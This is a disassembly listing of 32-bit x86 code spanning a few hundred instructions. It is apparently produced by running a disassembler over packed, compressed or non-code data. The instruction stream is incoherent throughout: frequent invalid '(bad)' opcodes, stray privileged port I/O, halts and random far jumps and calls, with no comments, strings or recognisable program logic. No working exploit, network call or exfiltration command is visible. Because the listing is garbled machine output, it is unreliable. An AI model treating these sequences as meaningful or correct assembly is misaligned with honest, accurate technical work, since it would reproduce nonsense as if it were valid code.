1315be52:	8d 7c 24 10          	lea    0x10(%esp),%edi
1315be56:	ff                   	(bad)
1315be57:	b8 6d 14 22 41       	mov    $0x4122146d,%eax
1315be5c:	d2 51 ba             	rclb   %cl,-0x46(%ecx)
1315be5f:	3c 6d                	cmp    $0x6d,%al
1315be61:	57                   	push   %edi
1315be62:	04 eb                	add    $0xeb,%al
1315be64:	03 9e e7 59 76 04    	add    0x47659e7(%esi),%ebx
1315be6a:	33 d2                	xor    %edx,%edx
1315be6c:	08 0c 10             	or     %cl,(%eax,%edx,1)
1315be6f:	14 7d                	adc    $0x7d,%al
1315be71:	89 e7                	mov    %esp,%edi
1315be73:	79 18                	jns    0x1315be8d
1315be75:	1c 20                	sbb    $0x20,%al
1315be77:	d4 89                	aam    $0x89
1315be79:	77 24                	ja     0x1315be9f
1315be7b:	54                   	push   %esp
1315be7c:	0e                   	push   %cs
1315be7d:	56                   	push   %esi
1315be7e:	34 f6                	xor    $0xf6,%al
1315be80:	50                   	push   %eax
1315be81:	24 56                	and    $0x56,%al
1315be83:	44                   	inc    %esp
1315be84:	18 d8                	sbb    %bl,%al
1315be86:	57                   	push   %edi
1315be87:	29 9a 19 f8 0e 84    	sub    %ebx,-0x7bf107e7(%edx)
1315be8d:	b7 dd                	mov    $0xdd,%bh
1315be8f:	ca dd 11             	lret   $0x11dd
1315be92:	c4                   	(bad)
1315be93:	da 23                	fisubl (%ebx)
1315be95:	04 b8                	add    $0xb8,%al
1315be97:	98                   	cwtl
1315be98:	68 ec 6d bb 07       	push   $0x7bb6dec
1315be9d:	d1 69 56             	shrl   $1,0x56(%ecx)
1315bea0:	f4                   	hlt
1315bea1:	29 83 30 88 38 3c    	sub    %eax,0x3c388830(%ebx)
1315bea7:	50                   	push   %eax
1315bea8:	ef                   	out    %eax,(%dx)
1315bea9:	11 a7 00 a3 d4 38    	adc    %esp,0x38d4a300(%edi)
1315beaf:	8a 86 ea ce f8 71    	mov    0x71f8ceea(%esi),%al
1315beb5:	6b 8a 3a 09 5b 06 02 	imul   $0x2,0x65b093a(%edx),%ecx
1315bebc:	60                   	pusha
1315bebd:	d8 27                	fsubs  (%edi)
1315bebf:	54                   	push   %esp
1315bec0:	4b                   	dec    %ebx
1315bec1:	38 db                	cmp    %bl,%bl
1315bec3:	06                   	push   %es
1315bec4:	dc 3b                	fdivrl (%ebx)
1315bec6:	8c b4 b9 78 88 0d 35 	mov    %?,0x350d8878(%ecx,%edi,4)
1315becd:	ec                   	in     (%dx),%al
1315bece:	0a 08                	or     (%eax),%cl
1315bed0:	7b d1                	jnp    0x1315bea3
1315bed2:	dc ff                	fdivr  %st,%st(7)
1315bed4:	76 10                	jbe    0x1315bee6
1315bed6:	eb 02                	jmp    0x1315beda
1315bed8:	7e 0c                	jle    0x1315bee6
1315beda:	8b 15 35 26 34 c3    	mov    0xc3342635,%edx
1315bee0:	ad                   	lods   %ds:(%esi),%eax
1315bee1:	2c 5b                	sub    $0x5b,%al
1315bee3:	1b dc                	sbb    %esp,%ebx
1315bee5:	0b 44 77 0b          	or     0xb(%edi,%esi,2),%eax
1315bee9:	da c2                	fcmovb %st(2),%st
1315beeb:	cf                   	iret
1315beec:	62 69 86             	bound  %ebp,-0x7a(%ecx)
1315beef:	13 25 b0 6c 62 58    	adc    0x58626cb0,%esp
1315bef5:	99                   	cltd
1315bef6:	89 71 1f             	mov    %esi,0x1f(%ecx)
1315bef9:	19 7b 38             	sbb    %edi,0x38(%ebx)
1315befc:	89 15 6d 8b 0b 8b    	mov    %edx,0x8b0b8b6d
1315bf02:	3b 55 dc             	cmp    -0x24(%ebp),%edx
1315bf05:	75 0d                	jne    0x1315bf14
1315bf07:	10 ba db 07 3b 42    	adc    %bh,0x423b07db(%edx)
1315bf0d:	76 21                	jbe    0x1315bf30
1315bf0f:	4e                   	dec    %esi
1315bf10:	1d 97 cc 91 6d       	sbb    $0x6d91cc97,%eax
1315bf15:	38 8c 8b eb 1a 36 09 	cmp    %cl,0x9361aeb(%ebx,%ecx,4)
1315bf1c:	d9 66 71             	fldenv 0x71(%esi)
1315bf1f:	da b8 4d a0 1d 0c    	fidivrl 0xc1da04d(%eax)
1315bf25:	40                   	inc    %eax
1315bf26:	5f                   	pop    %edi
1315bf27:	2c 81                	sub    $0x81,%al
1315bf29:	85 21                	test   %esp,(%ecx)
1315bf2b:	14 3e                	adc    $0x3e,%al
1315bf2d:	50                   	push   %eax
1315bf2e:	60                   	pusha
1315bf2f:	b2 a8                	mov    $0xa8,%dl
1315bf31:	64 d4 5b             	fs aam $0x5b
1315bf34:	75 64                	jne    0x1315bf9a
1315bf36:	51                   	push   %ecx
1315bf37:	b1 85                	mov    $0x85,%cl
1315bf39:	34 2b                	xor    $0x2b,%al
1315bf3b:	5c                   	pop    %esp
1315bf3c:	64 2a de             	fs sub %dh,%bl
1315bf3f:	26 ca f4 15          	es lret $0x15f4
1315bf43:	2b 35 16 0b 19 5f    	sub    0x5f190b16,%esi
1315bf49:	f6 d6                	not    %dh
1315bf4b:	38 34 6a             	cmp    %dh,(%edx,%ebp,2)
1315bf4e:	02 5a 73             	add    0x73(%edx),%bl
1315bf51:	a0 0e 21 19 88       	mov    0x8819210e,%al
1315bf56:	85 43 02             	test   %eax,0x2(%ebx)
1315bf59:	18 79 5c             	sbb    %bh,0x5c(%ecx)
1315bf5c:	3b 6c 25 db          	cmp    -0x25(%ebp,%eiz,1),%ebp
1315bf60:	85 4b 9e             	test   %ecx,-0x62(%ebx)
1315bf63:	00 53 43             	add    %dl,0x43(%ebx)
1315bf66:	8c d6                	mov    %ss,%esi
1315bf68:	ff 03                	incl   (%ebx)
1315bf6a:	d7                   	xlat   %ds:(%ebx)
1315bf6b:	60                   	pusha
1315bf6c:	6b 10 b3             	imul   $0xffffffb3,(%eax),%edx
1315bf6f:	fe                   	(bad)
1315bf70:	76 06                	jbe    0x1315bf78
1315bf72:	0f 50 f7             	movmskps %xmm7,%esi
1315bf75:	2d 16 09 16 0f       	sub    $0xf160916,%eax
1315bf7a:	a4                   	movsb  %ds:(%esi),%es:(%edi)
1315bf7b:	4d                   	dec    %ebp
1315bf7c:	d8 2b                	fsubrs (%ebx)
1315bf7e:	0d 8b 82 44 a4       	or     $0xa444828b,%eax
1315bf83:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
1315bf84:	b3 c6                	mov    $0xc6,%bl
1315bf86:	45                   	inc    %ebp
1315bf87:	c2 a2 22             	ret    $0x22a2
1315bf8a:	e1 2a                	loope  0x1315bfb6
1315bf8c:	bf c5 82 38 60       	mov    $0x603882c5,%edi
1315bf91:	4c                   	dec    %esp
1315bf92:	f1                   	int1
1315bf93:	92                   	xchg   %eax,%edx
1315bf94:	8b cb                	mov    %ebx,%ecx
1315bf96:	2a ca                	sub    %dl,%cl
1315bf98:	85 68 77             	test   %ebp,0x77(%eax)
1315bf9b:	c7                   	(bad)
1315bf9c:	ad                   	lods   %ds:(%esi),%eax
1315bf9d:	89 14 6d 42 a1 f0 b7 	mov    %edx,-0x480f5ebe(,%ebp,2)
1315bfa4:	46                   	inc    %esi
1315bfa5:	35 8c 08 66 11       	xor    $0x1166088c,%eax
1315bfaa:	46                   	inc    %esi
1315bfab:	96                   	xchg   %eax,%esi
1315bfac:	dc 24 d8             	fsubl  (%eax,%ebx,8)
1315bfaf:	62 a5 4c 05 c3 2a    	bound  %esp,0x2ac3054c(%ebp)
1315bfb5:	7f cb                	jg     0x1315bf82
1315bfb7:	f4                   	hlt
1315bfb8:	12 67 8c             	adc    -0x74(%edi),%ah
1315bfbb:	7b 00                	jnp    0x1315bfbd
1315bfbd:	97                   	xchg   %eax,%edi
1315bfbe:	68 e8 03 00 99       	push   $0x990003e8
1315bfc3:	7e 06                	jle    0x1315bfcb
1315bfc5:	63 43 a1             	arpl   %eax,-0x5f(%ebx)
1315bfc8:	10 ed                	adc    %ch,%ch
1315bfca:	7e 5d                	jle    0x1315c029
1315bfcc:	1c d2                	sbb    $0xd2,%al
1315bfce:	bf b0 6b c0 3c       	mov    $0x3cc06bb0,%edi
1315bfd3:	3b d8                	cmp    %eax,%ebx
1315bfd5:	7c e5                	jl     0x1315bfbc
1315bfd7:	74 da                	je     0x1315bfb3
1315bfd9:	9a fe b0 59 6f 21 0f 	lcall  $0xf21,$0x6f59b0fe
1315bfe0:	b1 0a                	mov    $0xa,%cl
1315bfe2:	b3 97                	mov    $0x97,%bl
1315bfe4:	5e                   	pop    %esi
1315bfe5:	c1 a2 16 7c 35 42 12 	shll   $0x12,0x42357c16(%edx)
1315bfec:	b7 08                	mov    $0x8,%bh
1315bfee:	1a 04 41             	sbb    (%ecx,%eax,2),%al
1315bff1:	b0 3a                	mov    $0x3a,%al
1315bff3:	75 74                	jne    0x1315c069
1315bff5:	0b 74 05 ae          	or     -0x52(%ebp,%eax,1),%esi
1315bff9:	2e 5c                	cs pop %esp
1315bffb:	18 0c 2f             	sbb    %cl,(%edi,%ebp,1)
1315bffe:	0a 36                	or     (%esi),%dh
1315c000:	37                   	aaa
1315c001:	87 0b                	xchg   %ecx,(%ebx)
1315c003:	20 75 05             	and    %dh,0x5(%ebp)
1315c006:	2d 00 db 6d cc       	sub    $0xcc6ddb00,%eax
1315c00b:	de be 4a 75 d2 33    	fidivrs 0x33d2754a(%esi)
1315c011:	ed                   	in     (%dx),%eax
1315c012:	bc 81 68 10 75       	mov    $0x75106881,%esp
1315c017:	85 e1                	test   %esp,%ecx
1315c019:	6e                   	outsb  %ds:(%esi),(%dx)
1315c01a:	b7 ba                	mov    $0xba,%bh
1315c01c:	68 09 b8 14 04       	push   $0x414b809
1315c021:	8b 0d 9c 82 12 0d    	mov    0xd12829c,%ecx
1315c027:	e2 d9                	loop   0x1315c002
1315c029:	7f 83                	jg     0x1315bfae
1315c02b:	ec                   	in     (%dx),%al
1315c02c:	4a                   	dec    %edx
1315c02d:	33 42 e6             	xor    -0x1a(%edx),%eax
1315c030:	64 6c                	fs insb (%dx),%es:(%edi)
1315c032:	e4 62                	in     $0x62,%al
1315c034:	ee                   	out    %al,(%dx)
1315c035:	3d 0c 63 30 11       	cmp    $0x1130630c,%eax
1315c03a:	8c 51 58             	mov    %ss,0x58(%ecx)
1315c03d:	1e                   	push   %ds
1315c03e:	86 c1                	xchg   %al,%cl
1315c040:	68 16 f5 d8 2a       	push   $0x2ad8f516
1315c045:	f5                   	cmc
1315c046:	53                   	push   %ebx
1315c047:	46                   	inc    %esi
1315c048:	fb                   	sti
1315c049:	19 7c dd a8          	sbb    %edi,-0x58(%ebp,%ebx,8)
1315c04d:	91                   	xchg   %eax,%ecx
1315c04e:	01 bb d0 98 05 8e    	add    %edi,-0x71fa6730(%ebx)
1315c054:	0c 88                	or     $0x88,%al
1315c056:	42                   	inc    %edx
1315c057:	0f 77                	emms
1315c059:	11 ba 12 02 93 e1    	adc    %edi,-0x1e6cfdee(%edx)
1315c05f:	62                   	(bad)
1315c060:	f4                   	hlt
1315c061:	83 54 86 70 1f       	adcl   $0x1f,0x70(%esi,%eax,4)
1315c066:	ac                   	lods   %ds:(%esi),%al
1315c067:	23 c6                	and    %esi,%eax
1315c069:	d9 38                	fnstcw (%eax)
1315c06b:	35 98 24 1e 46       	xor    $0x461e2498,%eax
1315c070:	b2 a7                	mov    $0xa7,%dl
1315c072:	19 04 03             	sbb    %eax,(%ebx,%eax,1)
1315c075:	c0 19 23             	rcrb   $0x23,(%ecx)
1315c078:	a4                   	movsb  %ds:(%esi),%es:(%edi)
1315c079:	93                   	xchg   %eax,%ebx
1315c07a:	14 a3                	adc    $0xa3,%al
1315c07c:	c9                   	leave
1315c07d:	aa                   	stos   %al,%es:(%edi)
1315c07e:	0d 01 9c 0a a0       	or     $0xa00a9c01,%eax
1315c083:	15 ac b0 74 23       	adc    $0x2374b0ac,%eax
1315c088:	04 60                	add    $0x60,%al
1315c08a:	ba 13 33 06 08       	mov    $0x8063313,%edx
1315c08f:	44                   	inc    %esp
1315c090:	b3 54                	mov    $0x54,%bl
1315c092:	b4 2c                	mov    $0x2c,%ah
1315c094:	89 ff                	mov    %edi,%edi
1315c096:	fe                   	(bad)
1315c097:	e0 15                	loopne 0x1315c0ae
1315c099:	db 09                	fisttpl (%ecx)
1315c09b:	03 8d 21 08 12 6d    	add    0x6d120821(%ebp),%ecx
1315c0a1:	b6 d0                	mov    $0xd0,%dh
1315c0a3:	48                   	dec    %eax
1315c0a4:	89 76 07             	mov    %esi,0x7(%esi)
1315c0a7:	08 57 a4             	or     %dl,-0x5c(%edi)
1315c0aa:	91                   	xchg   %eax,%ecx
1315c0ab:	31 b0 07 90 e6 ca    	xor    %esi,-0x35196ff9(%eax)
1315c0b1:	6d                   	insl   (%dx),%es:(%edi)
1315c0b2:	b9 5d 54 9d 99       	mov    $0x999d545d,%ecx
1315c0b7:	3b 6c 07 3b          	cmp    0x3b(%edi,%eax,1),%ebp
1315c0bb:	48                   	dec    %eax
1315c0bc:	ee                   	out    %al,(%dx)
1315c0bd:	2a c9                	sub    %cl,%cl
1315c0bf:	76 b8                	jbe    0x1315c079
1315c0c1:	0f 2f fe             	comiss %xmm6,%xmm7
1315c0c4:	5c                   	pop    %esp
1315c0c5:	96                   	xchg   %eax,%esi
1315c0c6:	40                   	inc    %eax
1315c0c7:	1a 2c 0a             	sbb    (%edx,%ecx,1),%ch
1315c0ca:	9c                   	pushf
1315c0cb:	e0 6b                	loopne 0x1315c138
1315c0cd:	68 08 88 f8 4c       	push   $0x4cf88808
1315c0d2:	93                   	xchg   %eax,%ebx
1315c0d3:	74 80                	je     0x1315c055
1315c0d5:	b7 8f                	mov    $0x8f,%bh
1315c0d7:	57                   	push   %edi
1315c0d8:	91                   	xchg   %eax,%ecx
1315c0d9:	07                   	pop    %es
1315c0da:	4f                   	dec    %edi
1315c0db:	c8 39 b8 24          	enter  $0xb839,$0x24
1315c0df:	96                   	xchg   %eax,%esi
1315c0e0:	ea fd 9a 0b 41 f3 0f 	ljmp   $0xff3,$0x410b9afd
1315c0e7:	98                   	cwtl
1315c0e8:	a3 19 80 84 55       	mov    %eax,0x55848019
1315c0ed:	45                   	inc    %ebp
1315c0ee:	83 7f 3d 60          	cmpl   $0x60,0x3d(%edi)
1315c0f2:	01 46 53             	add    %eax,0x53(%esi)
1315c0f5:	6c                   	insb   (%dx),%es:(%edi)
1315c0f6:	83 67 85 64          	andl   $0x64,-0x7b(%edi)
1315c0fa:	03 c2                	add    %edx,%eax
1315c0fc:	11 51 77             	adc    %edx,0x77(%ecx)
1315c0ff:	74 06                	je     0x1315c107
1315c101:	19 e4                	sbb    %esp,%esp
1315c103:	ec                   	in     (%dx),%al
1315c104:	73 07                	jae    0x1315c10d
1315c106:	f8                   	clc
1315c107:	f4                   	hlt
1315c108:	f0 80 24 45 44 6b a6 	lock andb $0xc6,0x68a66b44(,%eax,2)
1315c10f:	68 c6 
1315c111:	0c f7                	or     $0xf7,%al
1315c113:	2a 8f 68 27 95 4d    	sub    0x4d952768(%edi),%cl
1315c119:	b1 88                	mov    $0x88,%cl
1315c11b:	f4                   	hlt
1315c11c:	c0 08 11             	rorb   $0x11,(%eax)
1315c11f:	c1 6b 07 89          	shrl   $0x89,0x7(%ebx)
1315c123:	c3                   	ret
1315c124:	6a 15                	push   $0x15
1315c126:	2e 1b 7e 55          	sbb    %cs:0x55(%esi),%edi
1315c12a:	26 aa                	es stos %al,%es:(%edi)
1315c12c:	14 8e                	adc    $0x8e,%al
1315c12e:	92                   	xchg   %eax,%edx
1315c12f:	88 fc                	mov    %bh,%ah
1315c131:	4c                   	dec    %esp
1315c132:	10 47 2a             	adc    %al,0x2a(%edi)
1315c135:	fc                   	cld
1315c136:	6a ff                	push   $0xffffffff
1315c138:	21 63 27             	and    %esp,0x27(%ebx)
1315c13b:	9d                   	popf
1315c13c:	1e                   	push   %ds
1315c13d:	3e c4                	ds (bad)
1315c13f:	fd                   	std
1315c140:	9e                   	sahf
1315c141:	f8                   	clc
1315c142:	22 89 20 76 92 aa    	and    -0x556d89e0(%ecx),%cl
1315c148:	04 aa                	add    $0xaa,%al
1315c14a:	89 0c 11             	mov    %ecx,(%ecx,%edx,1)
1315c14d:	55                   	push   %ebp
1315c14e:	70 3a                	jo     0x1315c18a
1315c150:	23 f8                	and    %eax,%edi
1315c152:	59                   	pop    %ecx
1315c153:	7c f2                	jl     0x1315c147
1315c155:	92                   	xchg   %eax,%edx
1315c156:	4b                   	dec    %ebx
1315c157:	9e                   	sahf
1315c158:	2f                   	das
1315c159:	c5 99 ee cc 99 8c    	lds    -0x73663312(%ecx),%ebx
1315c15f:	ea 1f 46 37 73 5a 68 	ljmp   $0x685a,$0x7337461f
1315c166:	34 9a                	xor    $0x9a,%al
1315c168:	ea 9e c9 7e 75 8c a3 	ljmp   $0xa38c,$0x757ec99e
1315c16f:	34 68                	xor    $0x68,%al
1315c171:	6c                   	insb   (%dx),%es:(%edi)
1315c172:	0e                   	push   %cs
1315c173:	84 9c 9e 49 9e 49 88 	test   %bl,-0x77b661b7(%esi,%ebx,4)
1315c17a:	c4 8c f4 cd 21 9f 49 	les    0x499f21cd(%esp,%esi,8),%ecx
1315c181:	90                   	nop
1315c182:	28 9b 94 c3 18 61    	sub    %bl,0x6118c394(%ebx)
1315c188:	33 6c c2 69          	xor    0x69(%edx,%eax,8),%ebp
1315c18c:	4d                   	dec    %ebp
1315c18d:	05 77 59 66 2f       	add    $0x2f665977,%eax
1315c192:	d8 66 0d             	fsubs  0xd(%esi)
1315c195:	c1 11 0d             	rcll   $0xd,(%ecx)
1315c198:	76 8d                	jbe    0x1315c127
1315c19a:	3b 45 d7             	cmp    -0x29(%ebp),%eax
1315c19d:	05 5f 6e 07 66       	add    $0x66076e5f,%eax
1315c1a2:	d3 11                	rcll   %cl,(%ecx)
1315c1a4:	b9 87 48 d1 bf       	mov    $0xbfd14887,%ecx
1315c1a9:	99                   	cltd
1315c1aa:	68 31 c8 e6 ba       	push   $0xbae6c831
1315c1af:	b3 07                	mov    $0x7,%bl
1315c1b1:	65 1f                	gs pop %ds
1315c1b3:	73 05                	jae    0x1315c1ba
1315c1b5:	13 66 67             	adc    0x67(%esi),%esp
1315c1b8:	e0 66                	loopne 0x1315c220
1315c1ba:	dd 72 4f             	fnsave 0x4f(%edx)
1315c1bd:	65 09 07             	or     %eax,%gs:(%edi)
1315c1c0:	7c 79                	jl     0x1315c23b
1315c1c2:	eb 28                	jmp    0x1315c1ec
1315c1c4:	de 73 0d             	fidivs 0xd(%ebx)
1315c1c7:	05 17 11 66 55       	add    $0x55661117,%eax
1315c1cc:	b3 e7                	mov    $0xe7,%bl
1315c1ce:	06                   	push   %es
1315c1cf:	1b 62 3b             	sbb    0x3b(%edx),%esp
1315c1d2:	64 05 00 53 f6 5e    	fs add $0x5ef65300,%eax
1315c1d8:	ec                   	in     (%dx),%al
1315c1d9:	7b 47                	jnp    0x1315c222
1315c1db:	4f                   	dec    %edi
1315c1dc:	66 29 07             	sub    %ax,(%edi)
1315c1df:	33 51 eb             	xor    -0x15(%ecx),%edx
1315c1e2:	be 37 5b 07 00       	mov    $0x75b37,%esi
1315c1e7:	21 67 57             	and    %esp,0x57(%edi)
1315c1ea:	62 bb bd 17 a4 1b    	bound  %edi,0x1ba417bd(%ebx)
1315c1f0:	6b 4f 6e 13          	imul   $0x13,0x6e(%edi),%ecx
1315c1f4:	bf 5b b2 2f f6       	mov    $0xf62fb25b,%edi
1315c1f9:	0d 6a 27 03 65       	or     $0x6503276a,%eax
1315c1fe:	33 2b                	xor    (%ebx),%ebp
1315c200:	6d                   	insl   (%dx),%es:(%edi)
1315c201:	bc b1 ee 73 17       	mov    $0x1773eeb1,%esp
1315c206:	49                   	dec    %ecx
1315c207:	6d                   	insl   (%dx),%es:(%edi)
1315c208:	0b 6c 09 6c          	or     0x6c(%ecx,%ecx,1),%ebp
1315c20c:	19 c7                	sbb    %eax,%edi
1315c20e:	0c 80                	or     $0x80,%al
1315c210:	17                   	pop    %ss
1315c211:	8f                   	(bad)
1315c212:	e7 37                	out    %eax,$0x37
1315c214:	d0 78 2c             	sarb   $1,0x2c(%eax)
1315c217:	0a 98 b8 b8 0b 4a    	or     0x4a0bb8b8(%eax),%bl
1315c21d:	69 01 e0 10 ea 36    	imul   $0x36ea10e0,(%ecx),%eax
1315c223:	7e e9                	jle    0x1315c20e
1315c225:	0a c0                	or     %al,%al
1315c227:	34 1b                	xor    $0x1b,%al
1315c229:	68 12 57 02 5a       	push   $0x5a025712
1315c22e:	0f 7b                	(bad)
1315c230:	c9                   	leave
1315c231:	d4 22                	aam    $0x22
1315c233:	4c                   	dec    %esp
1315c234:	64 ac                	lods   %fs:(%esi),%al
1315c236:	52                   	push   %edx
1315c237:	d1 81 17 f1 22 ba    	roll   $1,-0x45dd0ee9(%ecx)
1315c23d:	28 8a 11 d6 7a 90    	sub    %cl,-0x6f8529ef(%edx)
1315c243:	68 b4 18 6a 1e       	push   $0x1e6a18b4
1315c248:	44                   	inc    %esp
1315c249:	17                   	pop    %ss
1315c24a:	89 70 11             	mov    %esi,0x11(%eax)
1315c24d:	57                   	push   %edi
1315c24e:	77 12                	ja     0x1315c262
1315c250:	f9                   	stc
1315c251:	81 d9 16 54 5a 0c    	sbb    $0xc5a5416,%ecx
1315c257:	57                   	push   %edi
1315c258:	b9 e3 30 07 f5       	mov    $0xf50730e3,%ecx
1315c25d:	eb 74                	jmp    0x1315c2d3
1315c25f:	2f                   	das
1315c260:	0e                   	push   %cs
1315c261:	14 5c                	adc    $0x5c,%al
1315c263:	e9 4e 00 3c eb       	jmp    0xfe51c2b6
1315c268:	5f                   	pop    %edi
1315c269:	76 67                	jbe    0x1315c2d2
1315c26b:	00 7d 04             	add    %bh,0x4(%ebp)
1315c26e:	c4 a0 52 3b 80 47    	les    0x47803b52(%eax),%esp
1315c274:	8d 44 d9 9b          	lea    -0x65(%ecx,%ebx,8),%eax
1315c278:	86 10                	xchg   %dl,(%eax)
1315c27a:	83 b1 84 80 53 c0 59 	xorl   $0x59,-0x3fac7f7c(%ecx)
1315c281:	5a                   	pop    %edx
1315c282:	1f                   	pop    %ds
1315c283:	83 37 b7             	xorl   $0xffffffb7,(%edi)
1315c286:	5a                   	pop    %edx
1315c287:	fb                   	sti
1315c288:	bf 84 01 80 1a       	mov    $0x1a800184,%edi
1315c28d:	50                   	push   %eax
1315c28e:	6c                   	insb   (%dx),%es:(%edi)
1315c28f:	c1 69 f3 05          	shrl   $0x5,-0xd(%ecx)
1315c293:	8b 26                	mov    (%esi),%esp
1315c295:	dd 44 0f 04          	fldl   0x4(%edi,%ecx,1)
1315c299:	75 50                	jne    0x1315c2eb
1315c29b:	c2 b2 52             	ret    $0x52b2
1315c29e:	c0 b0 ed 1f 0f 77 0b 	shlb   $0xb,0x770f1fed(%eax)
1315c2a5:	fe                   	(bad)
1315c2a6:	fe 0b                	decb   (%ebx)
1315c2a8:	6d                   	insl   (%dx),%es:(%edi)
1315c2a9:	d9 77 1e             	fnstenv 0x1e(%edi)
1315c2ac:	63 2f                	arpl   %ebp,(%edi)
1315c2ae:	74 14                	je     0x1315c2c4
1315c2b0:	43                   	inc    %ebx
1315c2b1:	83 fb 05             	cmp    $0x5,%ebx
1315c2b4:	7c 02                	jl     0x1315c2b8
1315c2b6:	30 42 0f             	xor    %al,0xf(%edx)
1315c2b9:	0c 71                	or     $0x71,%al
1315c2bb:	eb b7                	jmp    0x1315c274
1315c2bd:	e6 6a                	out    %al,$0x6a
1315c2bf:	b0 00                	mov    $0x0,%al
1315c2c1:	0e                   	push   %cs
1315c2c2:	9b                   	fwait
1315c2c3:	45                   	inc    %ebp
1315c2c4:	54                   	push   %esp
1315c2c5:	77 91                	ja     0x1315c258
1315c2c7:	af                   	scas   %es:(%edi),%eax
1315c2c8:	75 d8                	jne    0x1315c2a2
1315c2ca:	1b a2 6f 13 6c 44    	sbb    0x446c136f(%edx),%esp
1315c2d0:	0e                   	push   %cs
1315c2d1:	8b 6a 12             	mov    0x12(%edx),%ebp
1315c2d4:	5c                   	pop    %esp
1315c2d5:	3b 89 dc 33 9f 66    	cmp    0x669f33dc(%ecx),%ecx
1315c2db:	00 04 af             	add    %al,(%edi,%ebp,4)
1315c2de:	5b                   	pop    %ebx
1315c2df:	21 9d 48 5e f2 25    	and    %ebx,0x25f25e48(%ebp)
1315c2e5:	c4 0d 15 28 9d 04    	les    0x49d2815,%ecx
1315c2eb:	70 8a                	jo     0x1315c277
1315c2ed:	de 1e                	ficomps (%esi)
1315c2ef:	57                   	push   %edi
1315c2f0:	8b 4c 00 ed          	mov    -0x13(%eax,%eax,1),%ecx
1315c2f4:	97                   	xchg   %eax,%edi
1315c2f5:	9b                   	fwait
1315c2f6:	99                   	cltd
1315c2f7:	52                   	push   %edx
1315c2f8:	30 0a                	xor    %cl,(%edx)
1315c2fa:	26 f1                	es int1
1315c2fc:	39 e4                	cmp    %esp,%esp
1315c2fe:	6e                   	outsb  %ds:(%esi),(%dx)
1315c2ff:	f5                   	cmc
1315c300:	4e                   	dec    %esi
1315c301:	18 05 6e 56 67 ed    	sbb    %al,0xed67566e
1315c307:	fc                   	cld
1315c308:	50                   	push   %eax
1315c309:	cb                   	lret
1315c30a:	9c                   	pushf
1315c30b:	04 70                	add    $0x70,%al
1315c30d:	af                   	scas   %es:(%edi),%eax
1315c30e:	10 63 15             	adc    %ah,0x15(%ebx)
1315c311:	68 2c 19 f0 36       	push   $0x36f0192c
1315c316:	4d                   	dec    %ebp
1315c317:	62 25 ab c0 53 4e    	bound  %esp,0x4e53c0ab
1315c31d:	20 65 15             	and    %ah,0x15(%ebp)
1315c320:	7c 2a                	jl     0x1315c34c
1315c322:	2a 4b 56             	sub    0x56(%ebx),%cl
1315c325:	46                   	inc    %esi
1315c326:	01 03                	add    %eax,(%ebx)
1315c328:	56                   	push   %esi
1315c329:	c1 50 3f 28          	rcll   $0x28,0x3f(%eax)
1315c32d:	e6 02                	out    %al,$0x2
1315c32f:	18 09                	sbb    %cl,(%ecx)
1315c331:	1c 1b                	sbb    $0x1b,%al
1315c333:	2b 05 dd b0 00 08    	sub    0x800b0dd,%eax
1315c339:	82 5f c5 54          	sbbb   $0x54,-0x3b(%edi)
1315c33d:	c8 48 47 04          	enter  $0x4748,$0x4
1315c341:	50                   	push   %eax
1315c342:	ee                   	out    %al,(%dx)
1315c343:	b3 82                	mov    $0x82,%bl
1315c345:	4e                   	dec    %esi
1315c346:	1f                   	pop    %ds
1315c347:	00 48 75             	add    %cl,0x75(%eax)
1315c34a:	f6 a4 1f a3 68 15 8a 	mulb   -0x75ea975d(%edi,%ebx,1)
1315c351:	3e 8d 5d f0          	lea    %ds:-0x10(%ebp),%ebx
1315c355:	68 b4 e0 9b c0       	push   $0xc09be0b4
1315c35a:	5c                   	pop    %esp
1315c35b:	a2 da 47 34 28       	mov    %al,0x283447da
1315c360:	f0 58                	lock pop %eax
1315c362:	bc 25 bc 8b 9b       	mov    $0x9b8bbc25,%esp
1315c367:	68 84 a2 92 c9       	push   $0xc992a284
1315c36c:	9e                   	sahf
1315c36d:	10 3f                	adc    %bh,(%edi)
1315c36f:	68 90 09 9c b9       	push   $0xb99c0990
1315c374:	0f 99 64 a8 b8       	setns  -0x48(%eax,%ebp,4)
1315c379:	53                   	push   %ebx
1315c37a:	b9 c4 0a e8 24       	mov    $0x24e80ac4,%ecx
1315c37f:	41                   	inc    %ecx
1315c380:	5b                   	pop    %ebx
1315c381:	43                   	inc    %ebx
1315c382:	a2 98 8d 78 bb       	mov    %al,0xbb788d98
1315c387:	10 6d 6f             	adc    %ch,0x6f(%ebp)
1315c38a:	9d                   	popf
1315c38b:	81 3b e8 3e 0e 7c    	cmpl   $0x7c0e3ee8,(%ebx)
1315c391:	2e 28 b9 c2 be 58 60 	sub    %bh,%cs:0x6058bec2(%ecx)
1315c398:	a8 0b                	test   $0xb,%al
1315c39a:	15 d6 2e 68 b3       	adc    $0xb3682ed6,%eax
1315c39f:	ad                   	lods   %ds:(%esi),%eax
1315c3a0:	06                   	push   %es
1315c3a1:	79 68                	jns    0x1315c40b
1315c3a3:	3f                   	aas
1315c3a4:	1b 07                	sbb    (%edi),%eax
1315c3a6:	94                   	xchg   %eax,%esp
1315c3a7:	16                   	push   %ss
1315c3a8:	74 09                	je     0x1315c3b3
1315c3aa:	fa                   	cli
1315c3ab:	74 8d                	je     0x1315c33a
1315c3ad:	b5 1c                	mov    $0x1c,%ch
1315c3af:	ea 2e bd 1c 7d 0d d8 	ljmp   $0xd80d,$0x7d1cbd2e
1315c3b6:	84 4a a8             	test   %cl,-0x58(%edx)
1315c3b9:	b7 fc                	mov    $0xfc,%bh
1315c3bb:	eb 18                	jmp    0x1315c3d5
1315c3bd:	d6                   	salc
1315c3be:	fd                   	std
1315c3bf:	07                   	pop    %es
1315c3c0:	bc 3d b7 eb 75       	mov    $0x75ebb73d,%esp
1315c3c5:	38 7b 03             	cmp    %bh,0x3(%ebx)
1315c3c8:	69 16 c0 69 73 96    	imul   $0x967369c0,(%esi),%edx
1315c3ce:	cf                   	iret
1315c3cf:	15 84 09 e2 1d       	adc    $0x1de20984,%eax
1315c3d4:	f0 43                	lock inc %ebx
1315c3d6:	aa                   	stos   %al,%es:(%edi)
1315c3d7:	0c ff                	or     $0xff,%al
1315c3d9:	03 81 c2 a4 05 76    	add    0x7605a4c2(%ecx),%eax
1315c3df:	7b f7                	jnp    0x1315c3d8
1315c3e1:	7f 04                	jg     0x1315c3e7
1315c3e3:	83 3b 0a             	cmpl   $0xa,(%ebx)
1315c3e6:	75 e1                	jne    0x1315c3c9
1315c3e8:	a1 a8 23 8a 95       	mov    0x958a23a8,%eax
1315c3ed:	fa                   	cli
